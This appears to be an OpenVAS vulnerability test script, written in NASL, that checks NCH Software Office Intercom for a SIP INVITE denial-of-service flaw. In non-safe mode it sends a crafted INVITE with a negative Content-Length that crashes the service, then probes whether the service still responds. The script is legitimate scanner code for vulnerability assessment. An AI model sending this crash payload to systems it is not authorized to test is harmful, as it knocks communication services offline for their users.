###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nch_office_intercom_45049.nasl 14 2013-10-27 12:33:37Z jan $
#
# NCH Software Office Intercom SIP Invite Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "NCH Software Office Intercom is prone to a remote denial-of-service
vulnerability because it fails to properly handle specially crafted
SIP INVITE requests.

Exploiting this issue allows remote attackers to cause a denial-of-
service due to a NULL-pointer dereference. Due to the nature of this
issue, remote code execution may be possible; this has not been
confirmed.

Office Intercom 5.20 is vulnerable; other versions may also be
affected.";


if (description)
{
 script_id(100918);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-11-26 13:31:06 +0100 (Fri, 26 Nov 2010)");
 script_bugtraq_id(45049);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_name("NCH Software Office Intercom SIP Invite Remote Denial of Service Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45049");
 script_xref(name : "URL" , value : "http://www.nch.com.au/oi/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if installed Office Intercom is vulnerable");
 script_category(ACT_MIXED_ATTACK);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("sip_detection.nasl");
 script_require_ports("Services/udp/sip",5060);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("version_func.inc");

port = get_kb_item("Services/udp/sip");
if (!port) port = 5060;

banner =  get_kb_item(string("sip/banner/",port));
if(!banner || "NCH Software Office Intercom" >!< banner)exit(0);

function sip_alive(port) {

    local_var soc, r, opt;
    global_var port;

    if (islocalhost()) soc = open_sock_udp(port);
    else soc = open_priv_sock_udp(sport:5060, dport:port);
    if (!soc) return FALSE;

    opt = string(
        "OPTIONS sip:user..at..", get_host_name(), " SIP/2.0", "\r\n",
        "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
        "To: User <sip:user", get_host_name(), ":", port, ">\r\n",
        "From: OpenVAS <sip:openvas..at..", this_host(), ":", port, ">\r\n",
        "Call-ID: ", rand(), "\r\n",
        "CSeq: ", rand(), " OPTIONS\r\n",
        "Contact: OpenVAS <sip:openvas..at..", this_host(), ">\r\n",
        "Max-Forwards: 10\r\n",
	"Accept: application/sdp\r\n",
        "Content-Length: 0\r\n\r\n");

    send(socket:soc, data:opt);
    r = recv(socket:soc, length:1024);

    if(!r)return FALSE;

    if ("SIP/2.0" >< r)return TRUE;

    return FALSE;    

}


if(safe_checks()) {
 
  version = eregmatch(pattern:"NCH Software Office Intercom ([0-9.]+)",string:banner);
  if(isnull(version[1]))exit(0);

  if(version_is_less_equal(version:version[1],test_version:"5.20")) {
    security_warning(port:port,proto:"udp");
    exit(0);
  }  

} else {


  if (islocalhost()) soc = open_sock_udp(port);
  else soc = open_priv_sock_udp(sport:5060, dport:port);

  if(!soc)exit(0);

  req = string(
        "INVITE sip:105@", get_host_name()," SIP/2.0\r\n",
        "To: <sip:", get_host_name(),":",port,">\r\n",
        "Via: SIP/2.0/UDP localhost:10000\r\n",
        'From: "xsploitedsec"<sip:',get_host_name(),':10000>',"\r\n",
        "Call-ID: f81d4fae7dec11d0a76500a0c91e6bf6@localhost\r\n",
        "CSeq: 1 INVITE\r\n",
        "Max-Forwards: 70\r\n",
        "Content-Type: application/sdp\r\n",
        "Content-Length: -1");

  send(socket:soc, data:req);
  close(soc);

  if(!sip_alive(port:port)) {
    security_warning(port:port,proto:udp);
    exit(0);
  } 

}  

exit(0);
